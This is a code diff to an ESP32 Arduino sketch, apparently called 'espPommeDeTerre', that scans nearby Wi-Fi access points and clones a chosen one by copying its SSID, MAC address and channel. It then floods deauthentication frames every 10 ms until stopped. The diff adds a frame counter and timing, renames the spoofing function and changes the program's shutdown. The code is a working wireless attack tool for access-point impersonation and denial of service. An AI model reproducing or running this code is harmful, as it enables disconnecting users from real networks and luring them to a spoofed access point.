@@ -21,10 +21,8 @@ struct AP_info
     wifi_auth_mode_t authmode;
 };
 
-
 AP_info spoof_info;
 
-bool menace{false};
 
 void AccessPointScan()
 {
@@ -41,7 +39,7 @@ void AccessPointScan()
         Serial.println("Index SSID:\t\t MAC Address:\n");
         for (int i = 0; i < n; ++i)
         {
-            // Print SSID and MAC address
+            // Print Index, SSID, and MAC address
             Serial.printf(
                 "%d\t%s\t%s\n",
                 i+1,
@@ -71,7 +69,7 @@ void AccessPointScan()
     WiFi.scanDelete();
 }
 
-void SpoofMACaddress()
+void SpoofAccessPoint()
 {
     WiFi.disconnect(true);
     esp_wifi_stop();  // Stop Wi-Fi
@@ -81,7 +79,8 @@ void SpoofMACaddress()
 
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
     esp_wifi_init(&cfg);
-    esp_wifi_set_mode(WIFI_MODE_AP); delay(100);
+    esp_wifi_set_mode(WIFI_MODE_AP);
+    delay(100);
 
     auto err = esp_wifi_set_mac(WIFI_IF_AP, spoof_info.mac);  // Change MAC
     switch (err) {
@@ -109,7 +108,8 @@ void SpoofMACaddress()
     Serial.printf("Started AP spoof with SSID: %s, Channel: %d\n", spoof_info.ssid.c_str(), spoof_info.channel);
     state = State::DEAUTH;
 }
-
+unsigned long startTime;
+int attackFrames {0};
 void DeauthBegin()
 {
     Serial.println("Are you sure Y/n");
@@ -120,6 +120,8 @@ void DeauthBegin()
     case 'Y':
         Serial.println("ATTACKING...");
         state = State::ATTACK;
+        startTime = millis();
+        Serial.println("input 'stop' to stop attack");
         break;
     default:
         Serial.println("Aborting...");
@@ -132,14 +134,16 @@ void DeauthAttack() {
     if(Serial.available() > 0) {
         String input = Serial.readString();
         if ("stop" == input) {
+            double t = (double) (millis() - startTime) * 1e-3;
+            Serial.printf("Broadcast %d attack frames, in %lf seconds\n\n",  attackFrames, t);
             state = State::END;
         }
     }
     esp_wifi_deauth_sta(0);
+    attackFrames++;
     delay(10);
 }
 
-bool end_program{false};
 
 void setup()
 {
@@ -147,11 +151,9 @@ void setup()
     WiFi.mode(WIFI_MODE_STA); // Set ESP32 to Station mode
     WiFi.disconnect();        // Ensure we start clean
     delay(100);               // Short delay to stabilize 100
-    auto err = esp_wifi_get_mac(WIFI_IF_STA, spoof_info.mac);
-    if (err == ESP_OK)
-        Serial.printf("MAC adress: %s", WiFi.macAddress().c_str());
-    else Serial.println("No MAC for u");
 
+    Serial.println("Starting espPommeDeTerre...");
+    Serial.printf("MAC adress: %s\n", WiFi.macAddress().c_str());
     state = State::AP_SCAN;
 }
 
@@ -162,7 +164,7 @@ void loop()
             AccessPointScan();
             break;
         case State::AP_SPOOF:
-            SpoofMACaddress();
+            SpoofAccessPoint();
             break;
         case State::DEAUTH:
             DeauthBegin();
@@ -171,7 +173,7 @@ void loop()
             DeauthAttack();
             break;
         case State::END:
-            end_program = true;
+            WiFi.disconnect(true);
+            while(true) delay(100); // Idle until reset
     }
-    if (end_program) exit(0);
 }
